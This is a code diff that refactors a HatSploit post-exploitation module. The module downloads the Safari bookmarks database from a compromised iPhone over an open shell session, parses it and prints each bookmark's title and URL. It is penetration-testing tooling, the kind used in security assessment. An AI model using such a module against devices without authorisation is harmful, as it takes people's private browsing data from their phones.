@@ -6,15 +6,12 @@
 #
 
 from hatsploit.lib.module import Module
-from hatsploit.lib.config import Config
 
 from hatsploit.utils.session import SessionTools
 from hatsploit.utils.db import DBTools
 
 
 class HatSploitModule(Module, SessionTools, DBTools):
-    config = Config()
-
     details = {
         'Name': "Obtain Safari bookmarks",
         'Module': "post/iphoneos/shell/safari_bookmarks",
@@ -40,28 +37,26 @@ class HatSploitModule(Module, SessionTools, DBTools):
 
     def run(self):
         session = self.parse_options(self.options)
-        session = self.get_session(session)
 
-        if session:
-            loot = self.config.path_config['loot_path']
+        bookmarks_path = '/private/var/mobile/Library/Safari/Bookmarks.db'
+        local_path = self.session_download(session, bookmarks_path)
 
-            if session.download(
-                '/private/var/mobile/Library/Safari/Bookmarks.db', loot):
+        if local_path:
+            self.print_process("Parsing bookmarks database...")
 
-                self.print_process("Parsing bookmarks database...")
-                try:
-                    bookmarks = self.parse_safari_bookmarks(loot + 'Bookmarks.db')
-                except Exception:
-                    self.print_error("Failed to parse bookmarks database!")
-                    return
+            try:
+                bookmarks = self.parse_safari_bookmarks(local_path + 'Bookmarks.db')
+            except Exception:
+                self.print_error("Failed to parse bookmarks database!")
+                return
 
-                headers = ('Title', 'URL')
-                bookmarks_data = []
+            headers = ('Title', 'URL')
+            bookmarks_data = []
 
-                for item in bookmarks:
-                    bookmarks_data.append((item['title'], item['url']))
+            for item in bookmarks:
+                bookmarks_data.append((item['title'], item['url']))
 
-                if bookmarks_data:
-                    self.print_table("Bookmarks", headers, *bookmarks_data)
-                else:
-                    self.print_warning("No bookmarks available on device.")
+            if bookmarks_data:
+                self.print_table("Bookmarks", headers, *bookmarks_data)
+            else:
+                self.print_warning("No bookmarks available on device.")
